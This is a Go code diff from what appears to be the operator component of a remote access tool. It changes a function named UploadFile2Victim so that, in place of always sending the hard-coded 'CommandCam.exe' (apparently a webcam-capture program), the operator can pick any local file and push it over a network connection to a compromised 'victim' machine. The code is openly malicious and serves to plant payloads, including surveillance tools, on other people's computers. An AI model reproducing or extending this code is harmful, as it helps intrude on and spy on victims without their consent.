@@ -5,14 +5,19 @@ import (
 	"encoding/gob"
 	"errors"
 	"fmt"
+	"io/ioutil"
 	"net"
 	"os"
+	"strings"
 )
 
 type FileStruct struct {
 	FileName    string
 	FileSize    int
 	FileContent []byte
+}
+type FilesList struct {
+	Files []string
 }
 
 func CheckExistence(fileName string) bool {
@@ -47,13 +52,27 @@ func ReadFileContents(fileName string) ([]byte, error) {
 }
 
 func UploadFile2Victim(connection net.Conn) (err error) {
-	fileName := "CommandCam.exe"
+
+	var files []string
+	filesArr, _ := ioutil.ReadDir(".")
+	for index, file := range filesArr {
+		mode := file.Mode()
+		if mode.IsRegular() {
+			files = append(files, file.Name())
+			fmt.Println("\t ", index, "\t", file.Name())
+		}
+	}
+
+	fmt.Println("\n\b[#] Enter File Name with extension : ")
+	reader := bufio.NewReader(os.Stdin)
+	filename_raw, err := reader.ReadString('\n')
+	fileName := strings.TrimSpace(filename_raw)
 
 	fileExists := CheckExistence(fileName)
 	fmt.Println(fileExists)
 
 	if fileExists == false {
-		err = errors.New("File does not found")
+		err = errors.New("[#] Selected File not found")
 		return err
 	}
 
@@ -76,8 +95,8 @@ func UploadFile2Victim(connection net.Conn) (err error) {
 		return
 	}
 
-	reader := bufio.NewReader(connection)
-	status, err := reader.ReadString('\n')
+	reader1 := bufio.NewReader(connection)
+	status, err := reader1.ReadString('\n')
 
 	fmt.Println(status)
 
